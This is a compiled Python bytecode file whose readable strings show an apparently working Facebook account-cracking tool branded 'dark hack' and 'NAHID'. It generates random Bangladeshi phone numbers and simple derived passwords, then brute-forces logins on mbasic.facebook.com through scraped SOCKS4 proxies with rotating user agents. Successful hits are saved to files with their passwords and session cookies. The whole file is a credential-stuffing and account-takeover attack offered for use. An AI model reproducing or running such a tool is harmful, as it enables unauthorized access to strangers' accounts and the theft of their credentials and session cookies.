�
    �3�e�&  �                   �>  � d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl	Z	d dl
mZ d dl
mZ d dlZd dlmZ d dlmZ d dlmZ d dl mZ d dlmZ 	 d dlZd dlmZ d dlZd dlmZ n+# e$ r#  e j        d	�  �          e j        d
�  �         Y nw xY wdZdZdZdZdZ dZ!dZ"dZ#dZ$dZ%dZ&dZ'dZ(dZ)dZ*dZ+dZ,dZ-dZ.dZ/dZ0dZ1dZ2 ej3        �   �         Z3e3�4                    d �  �        Z5 ej3        �   �         Z6e6j7        Z8e6j9        Z:e6j;        Z< ej=        �   �         Z=d a>g a?g a@g ZAg ZBg ZC ejD        �   �         ZEg ZF	  ejG        d!�  �        jH        ZI eJd"d#�  �        �K                    eI�  �         n# eL$ rZM eNd$�  �         Y dZM[MndZM[Mww xY w eJd"d%�  �        �O                    �   �         �P                    �   �         ZI eQd&�  �        D ]_ZRd'ZS ejT        g d(��  �        ZU ejV        d)d*�  �        ZWd+ZXd,ZM ejV        d)d*�  �        ZYeS� eU� eW� eX� eM� eY� �ZZeB�[                    eZ�  �         �`d-� Z\d Z]e]d.k     r? e^d/�  �        Z_ e^d0�  �        Z`e_d1k    re`d2k    r eNd3�  �         n eNd4�  �         e]d)z  Z]�E e j        d5�  �         	 d6Zad7Zbd8� Zcd9� Zdd:� Zed;� Zf ed�   �          dS )<�    N)�BeautifulSoup)�date)�datetime)�sleep)�system)�ThreadPoolExecutor)�ConnectionErrorz9pip install mechanize requests futures bs4==2 > /dev/nullzpip install bs4z[1;91mz[1;97mz[1;32mz[1;33mz[1;34mz[1;35mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mz[0mz[1;90mz[1;107mz[1;106mz[1;105mz[1;104mz[1;103mz[1;102mz[1;101mz[1;100mz%H:%Mzwhttps://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=allz	.prox.txt�w� �ri'  �Nokia)�A�B�C�D�E�F�G�H�I�J�K�L�M�N�O�P�Q�R�S�T�U�V�W�X�Y�Z�   �c   z/GoBrowser/z1.6.0.c                 �>   � g | _         g | _        g | _        d| _        d S )Nr   )�id�ok�cp�loop)�selfs    �/storage/emulated/0/8/OK/30.py�__init__r1   H   s"   � ������������	�	�	�    l   M�? u5   [1;93m[[1;93m√[1;93m][38;5;50m ENTER USERNAME: u5   [1;93m[[1;93m√[1;93m][38;5;50m ENTER PASSWORD: �MTM�63z( [0;93mYou Have Successfully Logged in.z Incorrect Pass Please Trying �clearuN  
[1;95m【•】⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃➤
[1;92m______           _      _                _    
[38;5;46m|  _  \         | |    | |              | |   
[1;93m| | | |__ _ _ __| | __ | |__   __ _  ___| | __
[34;1m| | | / _` | '__| |/ / | '_ \ / _` |/ __| |/ /
[1;93m| |/ / (_| | |  |   <  | | | | (_| | (__|   < 
[38;5;196m|___/ \__,_|_|  |_|\_\ |_| |_|\__,_|\___|_|\_\                                                                                         
[38;5;46m【•】⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃➤ 
   
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃Facebook ID : Md Nayeem 		 ┃
 ┃owner :dark hack           	         ┃											
 ┃model : 11.0			 	 ┃
 ┃group : darkhack64	 	  	 ┃
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛uN  
[1;95m【•】⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃➤
[1;92m______           _      _                _    
[38;5;46m|  _  \         | |    | |              | |   
[1;93m| | | |__ _ _ __| | __ | |__   __ _  ___| | __
[34;1m| | | / _` | '__| |/ / | '_ \ / _` |/ __| |/ /
[1;93m| |/ / (_| | |  |   <  | | | | (_| | (__|   < 
[38;5;196m|___/ \__,_|_|  |_|\_\ |_| |_|\__,_|\___|_|\_\                                                                                         
[38;5;46m【•】⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃➤ 
   
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃Facebook ID : Md Nayeem	 	 ┃
 ┃owner :dark hack           	         ┃											
 ┃model : 11.0			 	 ┃
 ┃group : darkhack64	 	  	 ┃
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛c                  �$   � t          d�  �         d S )N�2==================================================)�print� r2   r0   �mumitxr:   �   s   � ��;�<�<�<�<�<r2   c                  �  � t          j        d�  �         t          t          �  �         t          d�  �         t          d�  �         t	          d�  �        } | dv rt          �   �          | dv rt          �   �          d S t          �   �          d S )Nr5   z [1] RANDOM CRACKz	 [0] Exitz
 [?] Choices : )�1)z 0�00)�osr   r8   �logo�input�fuck�exit)�Mumits    r0   �MainrD   �   s   � �
�	�'�����d�����!�"�"�"��k�����(�)�)���E�>�>��F�F�F��L� � ��F�F�F�F�F��F�F�F�F�Fr2   c                  �8  � g } t          j        d�  �         t          t          �  �         t          d�  �         t	          d�  �        }d�                    d� t          d�  �        D �   �         �  �        }d�                    d� t          d�  �        D �   �         �  �        }t          j        d�  �         t          t          �  �         t          d�  �         t          t	          d	�  �        �  �        }t          |�  �        D ]C}d�                    d
� t          d�  �        D �   �         �  �        }| �                    |�  �         �Dt          d��  �        5 }t          j        d�  �         t          t          �  �         t          t          | �  �        �  �        }t          d|z   �  �         t          d|z   �  �         t          d�  �         t          d�  �         t          d�  �         | D ]G}	||z   |z   |	z   }
||z   |z   |	z   ||	z   ||	z   ||z   |z   ddg}|�                    t          |
||�  �         �H	 d d d �  �         n# 1 swxY w Y   t          d�  �         t          d�  �         t          d�  �         t          d�  �         t          d�  �         d S )Nr5   z$[+] EXAMPLE CODE: 017, 018, 019, 016z[?] CHOOSE CODE : r   c              3   �R   K  � | ]"}t          j        t          j        �  �        V � �#d S �N��random�choice�string�digits��.0�_s     r0   �	<genexpr>zfuck.<locals>.<genexpr>�   s.   � � � �B�B�A�6�=���/�/�B�B�B�B�B�Br2   �   c              3   �R   K  � | ]"}t          j        t          j        �  �        V � �#d S rG   rH   rM   s     r0   rP   zfuck.<locals>.<genexpr>�   s.   � � � �A�A�1�&�-���.�.�A�A�A�A�A�Ar2   z"[+] EXAMPLE: 2000 3000 5000 10000 z[?] CHOOSE : c              3   �R   K  � | ]"}t          j        t          j        �  �        V � �#d S rG   rH   rM   s     r0   rP   zfuck.<locals>.<genexpr>�   s.   � � � �E�E�q�f�m�F�M�2�2�E�E�E�E�E�Er2   �   �   )�max_workersz[+] Total ids: z[+] Your Code: z[+] Process has been startedz [+] Use flight mode for speed upr7   �
bangladesh�
Bangladeshz% [+] Crack process has been completedz! [+] OK Ids saved in NAHID/OK.txtz! [+] CP Ids saved in NAHID/CP.txt)r>   r   r8   r?   r@   �join�range�int�append�
ThreadPool�logo1�str�len�submit�mumit2)�user�code�name�cod�limit�nmbr�nmp�yaari�tl�love�uid�pwxs               r0   rA   rA   �   s�  � �	�D��I�g����	�$�K�K�K�	�
0�1�1�1��%�&�&�D��7�7�B�B��q���B�B�B�B�B�D�
�'�'�A�A��a���A�A�A�
A�
A�C��I�g����	�$�K�K�K�	�
.�/�/�/���o�&�&�'�'�E��e��� � ���g�g�E�E�E�!�H�H�E�E�E�E�E�����C�����	��	#�	#�	#� ,�u�
�	�'�����e������T���^�^�����"�#�#�#����$�%�%�%��,�-�-�-��0�1�1�1��B�C�C�C�� 	,� 	,�D��t�)�C�-��$�C���9�S�=��%�c�$�h�t�D�y��d��3��|�T`�a�C��L�L���C��+�+�+�+�	,�,� ,� ,� ,� ,� ,� ,� ,� ,� ,� ,���� ,� ,� ,� ,� 
�
>�?�?�?�	�
1�2�2�2�	�
-�.�.�.�	�
-�.�.�.�	�
>�?�?�?�?�?s   �C I�I�Ic                 �8  � 	 |D �]�}t          j        t          �  �        }t          j        �   �         }t
          j        �                    dt          �d|�dt          t          �  �        �dt          t          �  �        �d�	�  �        f t
          j        �                    �   �          |�                    d�  �        j        }t          j        dt#          |�  �        �  �        �                    d�  �        t          j        d	t#          |�  �        �  �        �                    d�  �        t          j        d
t#          |�  �        �  �        �                    d�  �        t          j        dt#          |�  �        �  �        �                    d�  �        dd| |dd�	}i dd�dd�dd�dd�dd�dd�dd�dd�dd�d d!�d"d#�d$d%�d&d'�d(d)�d*d+�d,d-�d.d%�d/|d0��}|�                    d1||�2�  �        j        }	|j        �                    �   �         �                    �   �         }
d3|
v r�d4�                    d5� |j        �                    �   �         �                    �   �         D �   �         �  �        }|d6d7�         }t3          d8| � d9|� d:|� d;��  �         t5          d<d=�  �        �                    | d>z   |z   d;z   �  �         t          �                    | �  �          n�d?|
v r�d4�                    d@� |j        �                    �   �         �                    �   �         D �   �         �  �        }|dAdB�         }t3          dC|� dD|� d;��  �         t5          dEd=�  �        �                    | d>z   |z   dFz   �  �         t          �                    | �  �          n���t          dz  ad S #  Y d S xY w)GNz[1;92m[NAHID]--[�/z]--[CPz]~[OK-z] zhttps://mbasic.facebook.comzname="lsd" value="(.*?)"r(   zname="jazoest" value="(.*?)"zname="m_ts" value="(.*?)"zname="li" value="(.*?)"�0zLog In)	�lsd�jazoest�m_ts�li�
try_number�unrecognized_tries�email�pass�login�	authorityzmbasic.facebook.com�method�GET�pathzD/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl�scheme�https�acceptz�text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9zaccept-languagezen-GB,en-US;q=0.9,en;q=0.8zcache-controlz	max-age=0zcontent-typez!application/x-www-form-urlencoded�origin�refererzLhttps://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8z	sec-ch-uaz("Chromium";v="107", "Not=A?Brand";v="24"zsec-ch-ua-mobilez?1zsec-ch-ua-platformz	"Android"zsec-fetch-dest�documentzsec-fetch-mode�navigatezsec-fetch-sitezsame-originzsec-fetch-userr<   )zupgrade-insecure-requestsz
user-agentzWhttps://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=101)�data�headers�c_user�;c                 �$   � g | ]\  }}|d z   |z   ��S ��=r9   �rN   �key�values      r0   �
<listcomp>zmumit2.<locals>.<listcomp>�   �$   � �a�a�a���U�s�3�w�u�}�a�a�ar2   �   �   u!   [1;92m[NAHID-OK] ✅
Username : z 
Password : z 

Cookie : �
z/sdcard/NAHID/OK.txt�az | �
checkpointc                 �$   � g | ]\  }}|d z   |z   ��S r�   r9   r�   s      r0   r�   zmumit2.<locals>.<listcomp>�   r�   r2   �R   �a   z[1;92m[NAHID-CP] 
Username : z
Password : z/sdcard/NAHID-CP.txtz 
)rI   rJ   �ugen�requests�Session�sys�stdout�writer.   r`   �cps�oks�flush�get�text�re�searchr_   �group�post�cookies�get_dict�keysrY   �itemsr8   �openr\   )rm   rn   rk   �ps�pro�session�free_fb�log_data�header_freefb�lo�log_cookies�coki�cids                r0   rb   rb   �   s]  � �
@�� <	� <	�B��-��%�%�C��&�(�(�G��J����PT�PT�PT�UW�UW�UW�X[�\_�X`�X`�X`�X`�ad�eh�ai�ai�ai�ai�j�k�k�l�l��J�������k�k�"?�@�@�E�G��i� :�C��L�L�I�I�O�O�PQ�R�R��i� >��G���M�M�S�S�TU�V�V��9�8�#�g�,�,�G�G�M�M�a�P�P���4�c�'�l�l�C�C�I�I�!�L�L��!$����	� 	�H��[�*?� ��U���Y�� �W�� �  `�	�
 �;�� �[�� �?�� �3�� �e�� �C�� ��� !�+�� �j�� �j�� �m��  �d�!�" *-��%� � �M�& ���w�  ~F�  O\��  ]�  ]�  b�B���0�0�2�2�7�7�9�9�K��;�&�&��X�X�a�a�g�o�>V�>V�>X�>X�>^�>^�>`�>`�a�a�a�b�b���1�R�4�j��� ��� ��� � �� � � � � � �+�S�1�1�7�7��U��2��d�9J�K�K�K��
�
�3��������,�,��X�X�a�a�g�o�>V�>V�>X�>X�>^�>^�>`�>`�a�a�a�b�b���2�b�5�k��� ��� ��� � � � � � �+�S�1�1�7�7��U��2��e�9K�L�L�L��
�
�3��������a������������s   �NN �N)gr>   r�   �time�jsonrI   r�   rK   �platform�base64�uuid�bs4r   �sopr�   �ressr   r   r   r   �s�waktu�concurrent.futuresr   r]   �	mechanize�requests.exceptionsr	   �ModuleNotFoundError�RED�WHITE�GREEN�YELLOW�BLUE�ORANGEr   r   r   r   r   r"   r   r   r   �BN�BBL�BP�BB�BK�BH�BM�BA�now�strftime�	dt_string�current�year�ta�month�bu�day�ha�todayr.   r�   r�   �ugen2r�   �cokbrutr�   �ses�princpr�   r�   �proxr�   r�   �	Exception�er8   �read�
splitlinesrZ   �xdr�   rJ   �b�	randrange�c�d�f�uaku2r\   r1   �attempsr@   �username�passwordr?   r^   r:   rD   rA   rb   r9   r2   r0   �<module>r�      s�  �� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� $� $� $� $� $� $� � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � �!��O�O�O�C�C�C�C�C�C�����3�3�3�3�3�3�3��� !� !� !��B�I�I�J�J�J��B�I�� � � � � �!���� ������	����	�������������������������������������h�l�n�n���L�L��!�!�	�
�(�,�.�.���\���]���[����
��������������
���H�����	����x�|�  N�  O�  O�  T����k�#�����T�"�"�"�"��� � � ���r�����������������	�T�+�c�����!�!�,�,�.�.��
�%��,�,� � �B��A��f�m�  V�  V�  V�  W�  W�A��f��q�"���A��A��A��f��q�"���A�� �� �A� �q� �!� �Q� � �E��K�K������� � � �������u�X�Y�Y�H��u�X�Y�Y�H��%���H��,�,���;�<�<�<����.�/�/�/��1���� 	��	�'� � � � �	@��"
@��"=� =� =�� � � @�  @�  @�BE� E� E�N ������s*   �A- �-%B�B�;4E0 �0F
�5F�F
